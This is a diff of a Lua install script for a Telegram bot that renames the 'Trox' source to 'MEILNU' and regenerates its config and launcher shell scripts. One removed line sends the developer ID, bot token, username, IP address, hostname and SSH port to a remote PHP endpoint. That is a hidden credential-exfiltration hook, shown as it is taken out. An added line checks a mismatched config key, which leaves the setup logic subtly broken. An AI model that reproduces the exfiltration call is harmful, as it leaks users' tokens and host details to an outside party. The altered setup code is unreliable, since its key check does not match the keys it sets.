@@ -21,7 +21,7 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     MEILNU     --
 local AutoSet = function() 
-if not DevAbs:get(Server.."IdMEILNU") then 
+if not DevAbs:get(Server.."من ") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي -› ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
@@ -61,30 +61,29 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevRio:get(Server.."IdTrox"),
-TokenBot = DevRio:get(Server.."TokenTrox"),
-Trox = DevRio:get(Server.."TokenTrox"):match("(%d+)"),
-SudoIds = {DevRio:get(Server.."IdTrox")},
+DevId = DevAbs:get(Server.."IdMEILNU"),
+TokenBot = DevAbs:get(Server.."TokenMEILNU"),
+MEILNU = DevAbs:get(Server.."TokenMEILNU"):match("(%d+)"),
+SudoIds = {DevAbs:get(Server.."IdMEILNU")},
 }
 Create(Config, "./config.lua") 
-https.request("https:///Api/Trox/index.php?Get=Trox&DevId="..DevRio:get(Server.."IdTrox").."&TokenBot="..DevRio:get(Server.."TokenTrox").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("Trox.sh", "w")  
+file = io.open("MEILNU.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/Trox
-token="]]..DevRio:get(Server.."TokenTrox")..[["
+cd $HOME/MEILNU
+token="]]..DevAbs:get(Server.."TokenMEILNU")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "━─━─━─ ⌔ ─━─━─━ ≈ ━─━─━─ ⌔ ─━─━─━ ≈ ┉ ≈ ┉"
 echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "━─━─━─ ⌔ ─━─━─━ ≈ ━─━─━─ ⌔ ─━─━─━ ≈ ┉ ≈ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "━─━─━─ ⌔ ─━─━─━ ≈ ━─━─━─ ⌔ ─━─━─━ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "━─━─━─ ⌔ ─━─━─━ ≈ ━─━─━─ ⌔ ─━─━─━ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 ./tg -s ./MEILNU.lua -p PROFILE --bot=$token
@@ -94,11 +93,11 @@ file:close()
 file = io.open("Run", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/Trox
+cd $HOME/MEILNU
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Trox -X kill
-screen -S Trox ./Trox.sh
+screen -S MEILNU -X kill
+screen -S MEILNU ./MEILNU.sh
 done
 ]]) 
 file:close() 
@@ -107,19 +106,20 @@ os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
 end
-local Load_Trox = function() 
+local Load_MEILNU = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
 else 
 f:close() 
-DevRio:del(Server.."IdTrox");DevRio:del(Server.."TokenTrox")
+DevAbs:del(Server.."IdMEILNU");DevAbs:del(Server.."TokenMEILNU")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
-Load_Trox() 
-print("\27[36m"..[[          
+Load_MEILNU() 
+print("\27[36m"..[[ 
+Source MEILNU
 
 ___________                    
 \__    ___/______  _______  ___
